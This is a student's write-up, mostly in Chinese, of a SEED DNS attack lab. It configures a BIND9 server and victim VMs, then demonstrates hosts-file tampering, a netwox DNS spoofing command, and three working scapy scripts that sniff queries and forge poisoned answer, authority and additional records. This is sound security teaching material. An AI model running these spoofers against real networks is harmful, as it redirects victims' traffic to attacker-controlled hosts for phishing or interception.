# Local DNS Attack Lab



## Lab Tasks (Part I): Setting Up a Local DNS Server

`seedubuntu1`（`DNS server`）:

```shell
[10/22/20]seed@VM:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:7a:5d:47 brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.189/24 brd 192.168.2.255 scope global dynamic ens33
```



`seedubuntu2`（`Victim`）:

```shell
root@VM:/home/seed# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:d9:49:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.191/24 brd 192.168.2.255 scope global dynamic ens33
       valid_lft 1358sec preferred_lft 1358sec
    inet6 fe80::f582:3390:83a2:3e20/64 scope link 
       valid_lft forever preferred_lft forever
```

`kali`(`Attacker`):

```shell
kali@kali:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:66:7c:40 brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.178/24 brd 192.168.2.255 scope global dynamic noprefixroute eth0
       valid_lft 1796sec preferred_lft 1796sec
    inet6 fe80::20c:29ff:fe66:7c40/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

```







### Task 1: Confifigure the User Machine

在受害机上编辑`/etc/resolvconf/resolv.conf.d/head`

![image-20201022160031568](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022160031568.png)

`resolvconf -u`

![image-20201022160125173](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022160125173.png)

![image-20201022160145792](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022160145792.png)

`dig`命令 得到了回复

![image-20201022160237581](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022160237581.png)



###  Task 2: Set up a Local DNS Server

#### Step 1: Confifigure the BIND 9 server. 

添加`dump-file "/var/cache/bind/dump.db";`到`/etc/bind/named.conf.options. `

![image-20201022160733967](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022160733967.png)

缓存转储 && 缓存清除

```shell
$ sudo rndc dumpdb -cache // Dump the cache to the sepcified file
$ sudo rndc flush // Flush the DNS cache
```



#### Step 2: Turn off DNSSEC.

关闭`DNSSEC`，加入一行`dnssec-enable no`

![image-20201022161140545](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022161140545.png)



#### Step 3: Start DNS server.

```shell
 $ sudo service bind9 restart
```



#### Step 4: Use the DNS server.

回到受害机

![image-20201022162226732](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022162226732.png)

查看DNS缓存，看到`baidu.com`在缓存中

```shell
root@VM:/home/seed# cat /var/cache/bind/dump.db 
```

![image-20201022162441135](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022162441135.png)

为了减少DNS流量和解决时间，使用了DNS缓存。主机名解析后，结果将存储在本地。下次需要解析该地址时，结果将从缓存中获取，而不是发出另一个DNS请求。



###  Task 3: Host a Zone in the Local DNS Server

#### Step 1: Create zones.

向`/etc/bind/named.conf`写入如下数据

![image-20201022162936325](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022162936325.png)



#### Step 2: Setup the forward lookup zone fifile.

输入以下内容到`/etc/bind/example.com.db`

![image-20201022163825998](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022163825998.png)



#### Step 3: Set up the reverse lookup zone fifile. 

写入反向解析文件`/etc/bind/192.168.0.db`

![image-20201022164243427](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022164243427.png)



#### Step 4: Restart the BIND server and test.

![image-20201022164513870](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022164513870.png) 

解析得到ip地址为`192.168.0.101`



##  Lab Tasks (Part II): Attacks on DNS

### Task 4: Modifying the Host File

修改`/etc/hosts`文件前，`ping www.bank32.com`不通

在`/etc/hosts`文件中追加一行`1.1.1.1  www.bank32.com`

再次运行`ping`，结果是去`ping`了`1.1.1.1`

![image-20201022165946625](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022165946625.png)



###  Task 5: Directly Spoofifing Response to User

在攻击机中启动

```shell
kali@kali:~$ sudo netwox 105 -h "mail.example.net" -H "1.1.1.1" -a "ns.example.com" -A "1.1.1.1" -f "src host 192.168.2.191"
```

在受害机中运行`dig mail.example.net`

![image-20201022171956185](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022171956185.png)

可以看到被映射到了`1.1.1.1`



但是对于已经被DNS解析过的域名，这个攻击方法不起作用

### Task 6: DNS Cache Poisoning Attack

在攻击机与受害机中

![image-20201022173718321](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022173718321.png)

在`DNS`的`wireshark`中

![image-20201022173641482](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022173641482.png)

在DNS缓存中，域名的ip地址被攻击机欺骗到`1.1.1.1`

![image-20201022173829890](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022173829890.png)



###  Task 7: DNS Cache Poisoning: Targeting the Authority Section

`scapy`代码

```python
#coding=utf-8
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='1.1.1.1')
        NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='csu.edu.cn')
        Addsec1 = DNSRR(rrname='csu.edu.cn', type='A', ttl=259200, rdata='2.2.2.2')
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,qdcount=1, ancount=1, nscount=1, arcount=1,an=Anssec, ns=NSsec1 ,ar=Addsec1)
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
		print("[+] got one")
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
```

dns服务器上抓取到的流量包。可以看到目标被解析到了另外的dns服务器

![image-20201023163329305](https://gitee.com/ethustdout/pics/raw/master/img/image-20201023163329305.png)

查看`dig`的结果

![image-20201023163343197](https://gitee.com/ethustdout/pics/raw/master/img/image-20201023163343197.png)



### Task 8: Targeting Another Domain

添加一对额外的包即可

```python
#coding=utf-8
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='1.1.1.1')
        NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')
        NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=260000, rdata='attacker32.com')
        Addsec1 = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='2.2.2.2')
        Addsec2 = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='3.3.3.3')
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,qdcount=1, ancount=1, nscount=2, arcount=2, an=Anssec, ns=NSsec1/NSsec2 ,ar=Addsec1/Addsec2)
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
        print("[+] got one")
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
```

受害机上看到的消息

![image-20201023165302665](https://gitee.com/ethustdout/pics/raw/master/img/image-20201023165302665.png)





### Task 9: Targeting the Additional Section

代码更新如下

```python
#coding=utf-8
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='1.1.1.1')
        NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')
        NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns.example.net')
        Addsec1 = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='2.2.2.2')
        Addsec2 = DNSRR(rrname='ns.example.net', type='A', ttl=259200, rdata='3.3.3.3')
        Addsec3 = DNSRR(rrname='www.facebook.com', type='A', ttl=259200, rdata='4.4.4.4')
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,qdcount=1, ancount=1, nscount=2, arcount=3,an=Anssec, ns=NSsec1/NSsec2 ,ar=Addsec1/Addsec2/Addsec3)
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
        print("[+] got one")

pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
```

在受害机上看到，被劫持

![image-20201023165757151](https://gitee.com/ethustdout/pics/raw/master/img/image-20201023165757151.png)